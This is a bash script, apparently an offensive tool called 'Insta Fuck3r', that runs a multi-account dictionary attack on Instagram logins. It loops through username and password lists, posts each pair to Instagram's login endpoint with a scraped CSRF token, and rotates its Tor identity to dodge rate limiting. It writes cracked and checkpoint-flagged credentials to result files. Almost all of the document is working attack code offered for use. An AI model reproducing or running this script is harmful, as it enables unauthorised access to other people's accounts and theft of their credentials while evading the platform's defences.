#!/bin/bash

# Insta Fuck3r
# Release on 08/02/2019
# Github: github.com/aryanrtm/instafuck3r
# © Copyright ~ 4WSec

# Color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m' # netral
O='\e[0m' # nothing
B='\e[5m' # blink
U='\e[4m' # underline

# Date
time=`date "+%d_%m_%Y"`

# Ratio
sl33p=5
con=2
threads=5

# Get Token
xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=$(curl -s -L -i "https://www.instagram.com/accounts/login/ajax/" | grep "csrftoken" | cut -d "=" -f2 | cut -d ";" -f1)


function banner()
{
	printf "${YW}
      ____
 /  /'    '\  \ 
 \ (   )(   ) /
  \{~~~~~~~~}/
   {   /\   }
   {  }  {  }    ${PP}[ ${CY}Multiple Instagram Dictionary Attack ${PP}]${YW}
  {  }    {  }   ${PP}[ ${CY}Author: ${RD}4WSec - Anon Cyber Team ${PP}]${YW}
 {- }      { -} 
_| |        | |_
\[ ]        [ ]/

"
}



# Dependencies
function chk_depen()
{
	clear
	if [[ -f "dependencies.conf" ]]; then
		sleep 1
	else
		printf "\t ${BL}[!] ${NT}Checking Guns ..........\n"
		echo ""
		touch dependencies.conf
		echo "# 4WSec Just Dropped Yo Instagram" >> dependencies.conf
		sleep 1
		curl -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}cURL ${NT}.......... ${GR}[✔]\n"
			echo "curl = yes" >> dependencies.conf
		else
			printf "\t ${YW}cURL ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install curl -y
		fi
		tor -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}Tor ${NT}.......... ${GR}[✔]\n"
			echo "tor = yes" >> dependencies.conf
		else
			printf "\t ${YW}Tor ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install tor -y
		fi
		screen -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}Screen ${NT}.......... ${GR}[✔]\n"
			echo "screen = yes"
		else
			printf "\t ${YW}Screen ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install screen -y
		fi
		sleep 5
		clear
	fi
}


function cHk_t0r()
{
	cHK=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org/ > /dev/null; echo $?)
	if [[ $cHK -gt 0 ]]; then
		printf "\t${CY}[ϟ] ${RD}TOR Connection is Dead. Type 'tor' or 'service tor start'.\n"
		exit 0
	fi

}


function ch4ng3_iP_t0r()
{
	killall -HUP tor
}


function g0_l0g1n(){
	local cHk_l0g1n=$(curl -s 'https://www.instagram.com/accounts/login/ajax/' \
			  -H 'Cookie: csrftoken='$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
			  -H 'X-Instagram-AJAX: 1' \
			  -H 'Referer: https://www.instagram.com/' \
			  -H 'X-CSRFToken:'$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
			  -H 'X-Requested-With: XMLHttpRequest' \
			  --data 'username='$us3rn4m3'&password='$p4sswd'&intent' \
			  -L --compressed -s -c c00kies.txt | grep -o '"authenticated": true')
	local cHk_l0g1n2=$(curl -s 'https://www.instagram.com/accounts/login/ajax/' \
			   -H 'Cookie: csrftoken='$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
			   -H 'X-Instagram-AJAX: 1' \
			   -H 'Referer: https://www.instagram.com/' \
			   -H 'X-CSRFToken:'$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
			   -H 'X-Requested-With: XMLHttpRequest' \
			   --data 'username='$us3rn4m3'&password='$p4sswd'&intent' \
			   -L --compressed -s -c c00kies.txt | grep -o '"authenticated": true')
	if [[ $cHk_l0g1n =~ '"authenticated": true' ]]; then
		printf "${GR}[✔] ${RD}Login Success :) [Username: ${GR}$us3rn4m3${RD}] ${RD}[Password: ${GR}$p4sswd${RD}]\n"
		echo "Username: $us3rn4m3 | Password: $p4sswd" >> account_results_$time.txt
		sleep 5
		ch4ng3_iP_t0r
	elif [[ $cHk_l0g1n2 =~ 'checkpoint_required' ]]; then
		  printf "${GR}[?] ${PP}Must Verify :3 [Username: ${GR}$us3rn4m3${RD}] ${RD}[Password: ${GR}$p4sswd${RD}]\n"
		  echo "Username: $us3rn4m3 | Password: $p4sswd" >> account_results_checkpoint_$time.txt
		  sleep 5
		  ch4ng3_iP_t0r
	else
		printf "${RD}[✘] ${YW}Login Failed :( [Username: ${NT}$us3rn4m3${YW}] [Password: ${NT}$p4sswd${YW}]\n"
	fi
}

function run()
{
	clear
	chk_depen
	cHk_t0r
	banner
	printf "${CY}"
	read -p "Enter Username List: " us3r;
	if [[ ! -e $us3r ]]; then
		printf " ${RD}[!] ${YW}File Not Found\n"
		exit 0
	fi
	read -p "Enter Password List: " p4ss;
	if [[ ! -e $p4ss ]]; then
		printf " ${RD}[!] ${YW}File Not Found\n"
		exit 0
	fi
	echo ""
	for us3rn4m3 in $(cat $us3r); do
		for p4sswd in $(cat $p4ss); do
			fast=$(expr $con % $threads)
			if [[ $fast == 0 && $con > 0 ]]; then
				sleep $sl33p
				printf "\t${NT}Sleep for ${sl33p}s - Nyannn ${YW}/ᐠ｡ꞈ｡ᐟ❁\∫\n"
				ch4ng3_iP_t0r
			fi
			g0_l0g1n &
		done
	done
	wait
}
run
